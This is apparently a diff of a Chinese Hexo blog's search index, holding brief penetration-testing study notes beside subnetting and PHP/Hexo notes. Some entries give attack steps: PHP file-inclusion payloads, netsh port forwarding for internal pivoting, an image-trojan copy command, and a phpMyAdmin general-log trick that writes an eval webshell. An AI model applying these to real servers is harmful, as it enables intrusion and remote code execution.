@@ -1,14 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[Test]]></title>
-    <url>%2F2019%2F09%2F10%2FTest%2F</url>
-    <content type="text"><![CDATA[测试:hiof锁定积分路撒地方穷三代分类进度非结算单 Test]]></content>
+    <title><![CDATA[博客标题]]></title>
+    <url>%2F2019%2F09%2F10%2FA%E6%A8%A1%E6%9D%BF%2F</url>
+    <content type="text"><![CDATA[测试:hiof锁定积分路撒地方穷三代分类进度非结算单 一级标题二级标题1代码块]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>分类</category>
       </categories>
       <tags>
-        <tag>Test</tag>
+        <tag>标签</tag>
       </tags>
   </entry>
   <entry>
@@ -57,6 +57,19 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[Network-Shell端口转发]]></title>
+    <url>%2F2019%2F08%2F19%2FNetwork-Shell%2F</url>
+    <content type="text"><![CDATA[NetSH(Network Shell)是windows系统本身提供的功能强大的网络配置命令行工具 netsh interface portproxy add v4tov4 – 添加通过 IPv4 的 IPv4 和代理连接到的侦听项目 netsh interface portproxy add v4tov4 [listenport=]|[connectaddress=]|[[connectport=]|][[listenaddress=]|] [[protocol=]tcp] 参数 listenport IPv4 侦听端口 connectaddress IPv4 连接地址 connectport IPv4 连接端口 listenaddress IPv4 侦听地址 protocol 使用的协议。现在只支持 TCP 实例 netsh interface portproxy add v4tov4 listenaddress=192.168.1.8 listenport=14941 connectaddress=192.168.1.118 connectport=1494 在IPV4下将监听本地IP 192.168.1.8:14941,接受到的数据转发给192.168.1.118:1494 netsh interface portproxy delete v4tov4 listenaddress=192.168.1.8 listenport=33891 在IPV4下删除监听本地IP 192.168.1.8:33891 netsh interface portproxy show v4tov4 查看在IPV4下配置的端口转发的策略]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>端口转发</tag>
+        <tag>内网渗透</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[文件包含漏洞]]></title>
     <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
     <content type="text"><![CDATA[常见文件包含函数 include() //遇错警告 include_once() require() //遇错停止 require_once() @include:包含的文件不存在,程序会继续执行 @require:包含文件不存在,程序停止执行 文件包含漏洞原理 文件包含漏洞产生的原因是在通过引入文件时,引用的文件名,用户可控,由于传入的文件名没有经过合理的校验,或者校验被绕过 常见漏洞代码12345if(isset($_GET[&apos;page&apos;]))&#123; include $_GET[&apos;page&apos;];&#125;else&#123; include &quot;one.php&quot;;&#125; 文件包含漏洞危害 配合文件上传漏洞GetShell 可以执行任意脚本代码 网站源码以及配置文件泄露 远程包含GetShell 控制整个网站,甚至是服务器 文件包含漏洞分类 当被包含的文件在服务器本地时,就形成了本地文件包含漏洞 远程文件包含原理和本地文件包含同理 当php.ini中配置选项allow_url_fopen和allow_url_include 为 On 的话,则存在远程文件包含 %00 截断 需要magic_quotes_gpc=off PHP版本要小于5.3.4 路径长度截断 Windows文件名长于256Linux文件名长于4096 伪协议 读网站源码文件 index.php?page=php://filter/read=convert.base64-encode/resource=index.php @ 直接包含木马文件，可以是图片，txt,压缩包…. ?page=php://input接收POST请求,需要开启allow_url_include ?page=http://192.168.14.80/www/1.txt &gt; [phpinfo()]需要开启allow_url_fopen 和 allow_url_include (远程包含) ?page=data://text/plain,需要开启allow_url_fopen 和 allow_url_include 包含日志文件Getshell 首先要找到日志文件存放位置 php.ini的配置选项allow_url_fopen 和 allow_url_include为on 远程服务器上存放一个txt文件 , 或者不被解析的php文件 因为包含的时候返回的是php源代码，所以不能被解析 修复方法 PHP中使用open_basedir配置限制访问在指定的区域 过滤 .（点）/（反斜杠）\（反斜杠） 禁止服务器远程文件包含 (allow_url_fopen , allow_url_include , off)]]></content>
@@ -79,19 +92,6 @@
         <tag>PHP</tag>
         <tag>文件查看</tag>
         <tag>文件下载</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Network-Shell端口转发]]></title>
-    <url>%2F2019%2F08%2F19%2FNetwork-Shell%2F</url>
-    <content type="text"><![CDATA[NetSH(Network Shell)是windows系统本身提供的功能强大的网络配置命令行工具 netsh interface portproxy add v4tov4 – 添加通过 IPv4 的 IPv4 和代理连接到的侦听项目 netsh interface portproxy add v4tov4 [listenport=]|[connectaddress=]|[[connectport=]|][[listenaddress=]|] [[protocol=]tcp] 参数 listenport IPv4 侦听端口 connectaddress IPv4 连接地址 connectport IPv4 连接端口 listenaddress IPv4 侦听地址 protocol 使用的协议。现在只支持 TCP 实例 netsh interface portproxy add v4tov4 listenaddress=192.168.1.8 listenport=14941 connectaddress=192.168.1.118 connectport=1494 在IPV4下将监听本地IP 192.168.1.8:14941,接受到的数据转发给192.168.1.118:1494 netsh interface portproxy delete v4tov4 listenaddress=192.168.1.8 listenport=33891 在IPV4下删除监听本地IP 192.168.1.8:33891 netsh interface portproxy show v4tov4 查看在IPV4下配置的端口转发的策略]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>端口转发</tag>
-        <tag>内网渗透</tag>
-        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -132,17 +132,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[图片马制作]]></title>
-    <url>%2F2019%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%2F</url>
-    <content type="text"><![CDATA[copy xx.jpg /b + xx.txt /a = shell.jpg/b 二进位文件(不破原文件)/a ASCII 文本文件]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>木马</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[phpmyadmin通过日志文件拿webshell]]></title>
     <url>%2F2019%2F08%2F12%2Fphpmyadmin%E9%80%9A%E8%BF%87%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%8B%BFwebshell%2F</url>
     <content type="text"><![CDATA[前提: root用户 思路: general log设置为ON 利用mysql的一个日志文件 这个日志文件每执行一个sql语句就会将其执行的保存 将这个日志文件修改为.php文件保存 然后执行一条一句话的sql语句 使用菜刀连接即可 三句话 set global general_log=’on’; SET global general_log_file=’C:/webshell/www/cmd.php’; SELECT ‘&lt;?php @eval($_POST[‘cmd’]);?&gt;‘;]]></content>
@@ -152,6 +141,17 @@
       <tags>
         <tag>phpmyadmin</tag>
         <tag>Webshell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[图片马制作]]></title>
+    <url>%2F2019%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%2F</url>
+    <content type="text"><![CDATA[copy xx.jpg /b + xx.txt /a = shell.jpg/b 二进位文件(不破原文件)/a ASCII 文本文件]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>木马</tag>
       </tags>
   </entry>
   <entry>
@@ -178,6 +178,18 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[子网划分公式]]></title>
+    <url>%2F2019%2F07%2F10%2F%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%85%AC%E5%BC%8F%2F</url>
+    <content type="text"><![CDATA[12345678910112次方 十进制 二进制2^1=2 128 100000002^2=4 192 110000002^3=8 224 111000002^4=16 240 111100002^5=32 248 111110002^6=64 252 111111002^7=128 254 111111102^8=256 255 111111112^9=512 2^10=1024 子网划分中的3个公式：求可容纳的主机数 2的m次方-2 m表示子网中0的个数（是2进制）；-2表示一个网络地址，一个广播地址。 求可以划分的网段数 2的n次方 n表示“借位”的个数——-&gt;网络位向主机位借的“1”的个数。 求范围 256-X （X表示子网掩码中非255的数） 举例 一个公司有4个部门（市场部、后勤部、财务部、销售部），每个部门有35台主机，要使用192.168.1.0/24来做地址划分4个不同的小网段。如何划分？ 原IP/MASK：192.168.1.0/24 2的n次方要小于等于子网个数 (2^n&gt;=4 n&gt;=2) 新的MASK 255.255.255.192 (11111111.11111111.11111111.11 000000) 256-192=64 12345范围：192.168.1.0 —— 192.168.1.63/26192.168.1.64 —— 192.168.1.127/26192.168.1.128 —— 192.168.1.191/26192.168.1.192 —— 192.168.1.255/26 反推网络地址和广播地址 111.243.77.191/11 思路： 现MASK – /11 255.111 00000.0.0 x=224 256-224=32123456范围：111.0.0.0 -- 111.31.255.255/11111.32.0.0 -- 111.63.255.255/11........243/32=7.....9111.32*7.0.0 -- 111.32*8-1.255.255/11111.224.0.0 -- 111.255.255.255/11]]></content>
+      <categories>
+        <category>Network</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+        <tag>子网划分</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[PHP连接MySql]]></title>
     <url>%2F2019%2F07%2F10%2FPHP%E8%BF%9E%E6%8E%A5MySql%2F</url>
     <content type="text"><![CDATA[mysqli =&gt; mysql improve函数123456789101112131415161718192021$conn=mysqli_connect() //连接数据库mysqli_connect_errno() //获取数据库连接错误号mysqli_connect_error //获取数据库连接错误信息$result=mysqli_query($con,$sql) //执行查询语句mysqli_num_rows //获取查询结果的记录数musqli_affected_rows //获取更新或删除或插入语句影响的记录数mysqli_fetch_assoc //把查询结果集中的一条记录读取为关联数组mysqli_close //关闭数据库连接$row = mysqli_fetch_assoc($result) //将查询结果集保存为关系型数组$row = mysqli_fetch_array($result) //将查询结果集保存为普通数组mysqli_free_result($result) //释放结果集]]></content>
@@ -188,18 +200,6 @@
         <tag>Mysql</tag>
         <tag>函数</tag>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[子网划分公式]]></title>
-    <url>%2F2019%2F07%2F10%2F%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%85%AC%E5%BC%8F%2F</url>
-    <content type="text"><![CDATA[12345678910112次方 十进制 二进制2^1=2 128 100000002^2=4 192 110000002^3=8 224 111000002^4=16 240 111100002^5=32 248 111110002^6=64 252 111111002^7=128 254 111111102^8=256 255 111111112^9=512 2^10=1024 子网划分中的3个公式：求可容纳的主机数 2的m次方-2 m表示子网中0的个数（是2进制）；-2表示一个网络地址，一个广播地址。 求可以划分的网段数 2的n次方 n表示“借位”的个数——-&gt;网络位向主机位借的“1”的个数。 求范围 256-X （X表示子网掩码中非255的数） 举例 一个公司有4个部门（市场部、后勤部、财务部、销售部），每个部门有35台主机，要使用192.168.1.0/24来做地址划分4个不同的小网段。如何划分？ 原IP/MASK：192.168.1.0/24 2的n次方要小于等于子网个数 (2^n&gt;=4 n&gt;=2) 新的MASK 255.255.255.192 (11111111.11111111.11111111.11 000000) 256-192=64 12345范围：192.168.1.0 —— 192.168.1.63/26192.168.1.64 —— 192.168.1.127/26192.168.1.128 —— 192.168.1.191/26192.168.1.192 —— 192.168.1.255/26 反推网络地址和广播地址 111.243.77.191/11 思路： 现MASK – /11 255.111 00000.0.0 x=224 256-224=32123456范围：111.0.0.0 -- 111.31.255.255/11111.32.0.0 -- 111.63.255.255/11........243/32=7.....9111.32*7.0.0 -- 111.32*8-1.255.255/11111.224.0.0 -- 111.255.255.255/11]]></content>
-      <categories>
-        <category>Network</category>
-      </categories>
-      <tags>
-        <tag>网络</tag>
-        <tag>子网划分</tag>
       </tags>
   </entry>
   <entry>
@@ -249,6 +249,18 @@
       <tags>
         <tag>Mysql</tag>
         <tag>命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[hexo博客]]></title>
+    <url>%2F2019%2F06%2F09%2Fhexo%2F</url>
+    <content type="text"><![CDATA[hexo博客源文件12345title: postName #文章页面上的显示名称date: 2013-12-02 15:30:16 #文章生成时间categories: 默认分类 #分类tags: [tag1,tag2,tag3] #文章标签，可空，多标签请用格式，注意:后面有个空格description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面 命令123456789hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #部署到GitHubhexo help # 查看帮助hexo version #查看Hexo的版本hexo s -g #生成并本地预览hexo d -g #生成并上传]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>GitHub</tag>
       </tags>
   </entry>
 </search>
